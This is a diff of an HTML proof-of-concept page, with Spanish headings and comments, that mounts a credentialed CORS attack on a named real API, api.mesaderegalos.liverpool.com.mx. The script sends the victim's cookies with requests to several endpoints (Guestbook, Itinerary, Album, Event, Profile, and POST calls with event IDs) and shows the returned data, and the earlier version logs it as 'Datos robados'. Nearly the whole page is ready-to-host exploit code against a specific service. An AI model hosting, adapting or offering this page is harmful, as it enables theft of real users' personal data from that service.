@@ -1,24 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CORS Hijacking PoC</title>
+  <title>CORS Multi-Attack PoC</title>
+  <style>
+    body { font-family: monospace; background: #f4f4f4; padding: 20px; }
+    h2 { color: #c00; }
+    .endpoint { margin-bottom: 20px; padding: 10px; background: #fff; border-left: 4px solid #c00; }
+    pre { background: #eee; padding: 10px; overflow-x: auto; }
+  </style>
 </head>
 <body>
-  <h2>Ejecutando ataque CORS...</h2>
-  <pre id="output">Cargando...</pre>
+  <h2>🧨 Ataque CORS: Recolección masiva de datos</h2>
+  <div id="results"></div>
 
   <script>
-    fetch("https://api.mesaderegalos.liverpool.com.mx/Guestbook", {
-      method: "GET",
-      credentials: "include"  // Envia cookies de la víctima
-    })
-    .then(response => response.text())
-    .then(data => {
-      document.getElementById("output").textContent = data;
-      console.log("Datos robados:", data);
-    })
-    .catch(error => {
-      document.getElementById("output").textContent = "Error: " + error;
+    const endpoints = [
+      { path: "/Guestbook", method: "GET" },
+      { path: "/Itinerary", method: "GET" },
+      { path: "/Album", method: "GET" },
+      { path: "/Event", method: "GET" },
+      { path: "/Profile", method: "GET" },
+      { path: "/EventDetails", method: "POST", body: JSON.stringify({ eventId: "12345", source: "Online" }) },
+      { path: "/getProfileEventDetails", method: "POST", body: JSON.stringify({ eventId: "51458076", source: "Online" }) }
+    ];
+
+    const apiBase = "https://api.mesaderegalos.liverpool.com.mx";
+
+    const resultsDiv = document.getElementById("results");
+
+    endpoints.forEach(endpoint => {
+      const options = {
+        method: endpoint.method,
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        }
+      };
+      if (endpoint.method === "POST" && endpoint.body) {
+        options.body = endpoint.body;
+      }
+
+      fetch(apiBase + endpoint.path, options)
+        .then(res => res.text())
+        .then(data => {
+          const block = document.createElement("div");
+          block.className = "endpoint";
+          block.innerHTML = `<strong>${endpoint.method} ${endpoint.path}</strong><pre>${data}</pre>`;
+          resultsDiv.appendChild(block);
+        })
+        .catch(err => {
+          const block = document.createElement("div");
+          block.className = "endpoint";
+          block.innerHTML = `<strong>${endpoint.method} ${endpoint.path}</strong><pre>Error: ${err}</pre>`;
+          resultsDiv.appendChild(block);
+        });
     });
   </script>
 </body>
